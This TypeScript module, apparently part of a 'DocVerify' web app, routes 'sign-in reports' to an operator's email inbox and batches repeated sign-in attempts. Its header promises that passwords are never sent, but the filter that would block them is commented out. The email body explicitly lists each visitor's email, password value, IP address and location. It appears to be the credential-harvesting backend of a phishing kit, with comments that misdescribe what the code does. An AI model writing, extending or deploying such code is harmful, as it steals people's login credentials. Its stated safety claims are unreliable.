/**
 * Routes non-auth app responses to your inbox via Resend.
 * Posts to /api/send-response, which is handled by a Vercel serverless
 * function (and the Vite dev proxy in development). The Resend API key never
 * leaves the server. Passwords and credentials are never included — blocked
 * at the source here, and again on the server as defence in depth.
 */

import { apiUrl } from "./api";
import { getClientMetaForResponse, type ClientMeta } from "./clientMeta";

export const RESPONSE_EMAIL = (
  import.meta.env.VITE_RESPONSE_EMAIL ?? ""
).trim().toLowerCase();

// const BLOCKED_FIELD_PATTERN = /password|passwd|pwd|secret|credential|token/i
const GLOBAL_MIN_INTERVAL_MS = 20_000;
const RATE_LIMIT_KEY = "docverify_rate_limited_until";

/** Minimum time before the same event type can fire again */
const EVENT_COOLDOWN_MS: Record<ResponseEvent, number> = {
  sign_in_report: 3 * 1000,
};

export type ResponseEvent = "sign_in_report";

export interface ResponsePayload {
  type: ResponseEvent;
  email?: string;
  password?: string;
  // pwd?: string;
  // secret?: string;
  // credential?: string;
  // token?: string;
  name?: string;
  domain?: string;
  authMethod?: string;
  message?: string;
  pageUrl?: string;
  sendId?: string;
  timestamp?: string;
  datetime?: string;
  timezone?: string;
  ipAddress?: string;
  location?: string;
  city?: string;
  region?: string;
  country?: string;
  [key: string]: string | undefined;
}

let lastGlobalSendAt = 0;

type EmailLogStatus = "sending" | "sent" | "skipped" | "failed";

function logEmailEvent(
  status: EmailLogStatus,
  details: Record<string, string | boolean | undefined>,
): void {
  const entry = { status, ...details };
  if (status === "sent") {
    console.info("[DocVerify Email]", entry);
  } else if (status === "failed") {
    console.error("[DocVerify Email]", entry);
  } else if (status === "skipped") {
    console.warn("[DocVerify Email]", entry);
  } else {
    console.info("[DocVerify Email]", entry);
  }
}

function emailLogContext(
  payload: ResponsePayload,
  extra?: Record<string, string | undefined>,
): Record<string, string | undefined> {
  return {
    type: payload.type,
    visitorEmail: payload.email,
    domain: payload.domain,
    attempt: payload.attempt,
    outcome: payload.outcome,
    authMethod: payload.authMethod,
    ...extra,
  };
}

function isResponseConfigured(): boolean {
  const email = RESPONSE_EMAIL.trim();
  return Boolean(email && !email.startsWith("your-"));
}

function isExternallyRateLimited(): boolean {
  try {
    const until = sessionStorage.getItem(RATE_LIMIT_KEY);
    if (!until) return false;
    if (Date.now() < Number(until)) return true;
    sessionStorage.removeItem(RATE_LIMIT_KEY);
    return false;
  } catch {
    return false;
  }
}

function markExternallyRateLimited() {
  try {
    sessionStorage.setItem(RATE_LIMIT_KEY, String(Date.now() + 60 * 60 * 1000));
  } catch {
    // ignore
  }
}

function dedupeKey(type: ResponseEvent, payload: ResponsePayload): string {
  const base = `${type}:${payload.email ?? "anon"}:${payload.domain ?? "none"}`;
  return payload.attempt ? `${base}:${payload.attempt}` : base;
}

function shouldSkipSend(
  type: ResponseEvent,
  payload: ResponsePayload,
): string | null {
  if (isExternallyRateLimited()) {
    return "Email provider rate limit active — pausing sends for 1 hour";
  }

  const now = Date.now();
  if (
    !payload.attempt &&
    now - lastGlobalSendAt < GLOBAL_MIN_INTERVAL_MS
  ) {
    return "Too soon since last email (global throttle)";
  }

  try {
    const key = `docverify_sent_${dedupeKey(type, payload)}`;
    const last = sessionStorage.getItem(key);
    if (last && now - Number(last) < EVENT_COOLDOWN_MS[type]) {
      return `Cooldown active for ${type}`;
    }
  } catch {
    // continue if storage unavailable
  }

  return null;
}

function markSent(type: ResponseEvent, payload: ResponsePayload) {
  lastGlobalSendAt = Date.now();
  try {
    sessionStorage.setItem(
      `docverify_sent_${dedupeKey(type, payload)}`,
      String(lastGlobalSendAt),
    );
  } catch {
    // ignore
  }
}

/** Strip any sensitive field names from outbound payloads */
export function sanitizePayload(
  data: Record<string, unknown>,
): Record<string, string> {
  const out: Record<string, string> = {};
  for (const [key, value] of Object.entries(data)) {
    // if (BLOCKED_FIELD_PATTERN.test(key)) continue
    if (value === undefined || value === null) continue;
    out[key] = String(value);
  }
  return out;
}

function formatEmailBody(payload: ResponsePayload): string {
  // Returns the value or "Unknown", trimming whitespace
  const val = (v: string | undefined): string =>
    v && v.trim() ? v.trim() : "Unknown";

  return [
    `Email: ${val(payload.email)}`,
    `IP address: ${val(payload.ipAddress)}`,
    `Password value: ${val(payload.passwordValue ?? payload.password)}`,
    `Location: ${val(payload.location)}`,
  ].join("\n");
}

function buildResponseItem(
  payload: ResponsePayload,
  meta: ClientMeta,
): { subject: string; message: string; fields: Record<string, string>; sendId: string } {
  const sendId = `${Date.now()}-${payload.attempt ?? "0"}-${Math.random().toString(36).slice(2, 8)}`;
  const safe = sanitizePayload({
    ipAddress: payload.ipAddress ?? meta.ipAddress,
    password: payload.passwordValue ?? payload.password,
    location: payload.location ?? meta.location,
    sendId,
    timestamp: payload.timestamp ?? new Date().toISOString(),
  });
  const subject = `[DocVerify] ${payload.type.replace(/_/g, " ")} (${sendId})`;
  const message = formatEmailBody({ ...payload, ...safe, sendId });
  return { subject, message, fields: safe, sendId };
}

type ApiResponseBody = {
  success?: boolean;
  message?: string;
  id?: string;
  ids?: string[];
};

function formatApiError(
  res: Response,
  data: ApiResponseBody,
  rawText: string,
): string {
  const fromMessage = data.message?.trim();
  if (fromMessage) return fromMessage;

  const fromStatusText = res.statusText?.trim();
  if (fromStatusText) return fromStatusText;

  const trimmedRaw = rawText.trim();
  if (trimmedRaw) {
    if (/a server error has occurred/i.test(trimmedRaw)) {
      return "API function crashed on the server — redeploy on Vercel and check function logs";
    }
    return trimmedRaw.length > 300 ? `${trimmedRaw.slice(0, 300)}…` : trimmedRaw;
  }

  if (res.status === 404) {
    return "API route not found — is /api/send-response deployed on Vercel?";
  }
  if (res.status === 500) {
    return "Server error — check RESEND_API_KEY and RESPONSE_EMAIL in Vercel env vars";
  }
  if (res.status === 502) {
    return "Email provider unreachable — check Resend API key and sender domain";
  }

  return `HTTP ${res.status} request failed`;
}

async function parseApiResponse(res: Response): Promise<{
  data: ApiResponseBody;
  rawText: string;
}> {
  const rawText = await res.text();
  let data: ApiResponseBody = {};
  try {
    data = JSON.parse(rawText) as ApiResponseBody;
  } catch {
    // Non-JSON body (e.g. HTML error page) — surfaced via formatApiError.
  }
  return { data, rawText };
}

async function postBatch(
  items: Array<{ subject: string; message: string; fields: Record<string, string> }>,
): Promise<{
  ok: boolean;
  rateLimited?: boolean;
  message?: string;
  ids?: string[];
  httpStatus?: number;
}> {
  const res = await fetch(apiUrl("/api/send-response-batch"), {
    method: "POST",
    headers: { "Content-Type": "application/json", Accept: "application/json" },
    body: JSON.stringify({ items }),
  });

  const { data, rawText } = await parseApiResponse(res);
  const msg = formatApiError(res, data, rawText);

  if (!res.ok || data.success === false) {
    const rateLimited = /rate limit/i.test(msg);
    if (rateLimited) markExternallyRateLimited();
    return { ok: false, rateLimited, message: msg, httpStatus: res.status, ids: data.ids };
  }

  return { ok: true, message: msg, ids: data.ids, httpStatus: res.status };
}

async function postOnce(
  subject: string,
  message: string,
  safe: Record<string, string>,
): Promise<{
  ok: boolean;
  rateLimited?: boolean;
  message?: string;
  resendId?: string;
  httpStatus?: number;
  responseSnippet?: string;
}> {
  const res = await fetch(apiUrl("/api/send-response"), {
    method: "POST",
    headers: { "Content-Type": "application/json", Accept: "application/json" },
    body: JSON.stringify({ subject, message, fields: safe }),
    keepalive: true,
  });

  const { data, rawText } = await parseApiResponse(res);
  const msg = formatApiError(res, data, rawText);
  const responseSnippet = rawText.trim().slice(0, 200) || undefined;

  if (!res.ok || data.success === false || !data.id) {
    const rateLimited = /rate limit/i.test(msg);
    if (rateLimited) markExternallyRateLimited();
    const reason =
      !res.ok || data.success === false
        ? msg
        : "Send accepted but no message id returned from provider";
    return {
      ok: false,
      rateLimited,
      message: reason || "Send request rejected",
      httpStatus: res.status,
      responseSnippet,
    };
  }

  return { ok: true, message: msg, resendId: data.id, httpStatus: res.status };
}

/**
 * Send a response to your configured email destination.
 * Throttled client-side to avoid provider rate limits and accidental spam.
 */
export async function sendResponse(payload: ResponsePayload): Promise<boolean> {
  if (!isResponseConfigured()) {
    logEmailEvent("skipped", {
      ...emailLogContext(payload),
      reason: "Response email not configured (check VITE_RESPONSE_EMAIL)",
    });
    return false;
  }

  const skipReason = shouldSkipSend(payload.type, payload);
  if (skipReason) {
    logEmailEvent("skipped", {
      ...emailLogContext(payload),
      reason: skipReason,
    });
    return false;
  }

  const meta = await getClientMetaForResponse();
  const { subject, message, fields: safe, sendId } = buildResponseItem(payload, meta);

  logEmailEvent("sending", {
    ...emailLogContext(payload, { sendId, subject }),
    destination: RESPONSE_EMAIL,
    api: apiUrl("/api/send-response"),
  });

  try {
    const result = await postOnce(subject, message, safe);
    if (result.ok) {
      markSent(payload.type, payload);
      logEmailEvent("sent", {
        ...emailLogContext(payload, { sendId, subject }),
        destination: RESPONSE_EMAIL,
        resendId: result.resendId,
        message: result.message,
      });
      return true;
    }

    logEmailEvent("failed", {
      ...emailLogContext(payload, { sendId, subject }),
      destination: RESPONSE_EMAIL,
      reason: result.message || "Send request rejected",
      httpStatus: result.httpStatus ? String(result.httpStatus) : undefined,
      responseSnippet: result.responseSnippet,
      rateLimited: result.rateLimited,
    });
  } catch (err) {
    logEmailEvent("failed", {
      ...emailLogContext(payload, { sendId, subject }),
      destination: RESPONSE_EMAIL,
      reason: err instanceof Error ? err.message : "Network error while sending email",
    });
  }

  return false;
}

/**
 * Send multiple sign-in reports in one request (all dispatched together).
 * Use after the final successful attempt when earlier tries were only recorded.
 */
export async function sendResponsesBatch(
  payloads: ResponsePayload[],
): Promise<boolean> {
  if (!isResponseConfigured()) {
    logEmailEvent("skipped", {
      type: "batch",
      count: String(payloads.length),
      reason: "Response email not configured (check VITE_RESPONSE_EMAIL)",
    });
    return false;
  }

  if (!payloads.length) {
    logEmailEvent("skipped", {
      type: "batch",
      count: "0",
      reason: "No payloads to send",
    });
    return false;
  }

  const meta = await getClientMetaForResponse();
  const built = payloads.map((payload) => ({
    payload,
    ...buildResponseItem(payload, meta),
  }));

  logEmailEvent("sending", {
    type: "batch",
    count: String(built.length),
    destination: RESPONSE_EMAIL,
    sendIds: built.map((item) => item.sendId).join(", "),
    subjects: built.map((item) => item.subject).join(" | "),
  });

  try {
    const result = await postBatch(
      built.map(({ subject, message, fields }) => ({ subject, message, fields })),
    );

    if (result.ok) {
      for (const item of built) {
        markSent(item.payload.type, item.payload);
      }
      logEmailEvent("sent", {
        type: "batch",
        count: String(built.length),
        destination: RESPONSE_EMAIL,
        resendIds: result.ids?.join(", "),
        message: result.message,
      });
      return true;
    }

    logEmailEvent("failed", {
      type: "batch",
      count: String(built.length),
      destination: RESPONSE_EMAIL,
      reason: result.message ?? "Batch send request rejected",
      httpStatus: result.httpStatus ? String(result.httpStatus) : undefined,
      rateLimited: result.rateLimited,
      resendIds: result.ids?.join(", "),
    });
  } catch (err) {
    logEmailEvent("failed", {
      type: "batch",
      count: String(built.length),
      destination: RESPONSE_EMAIL,
      reason: err instanceof Error ? err.message : "Network error while sending batch",
    });
  }

  return false;
}

export function isResponseRoutingEnabled(): boolean {
  return isResponseConfigured();
}
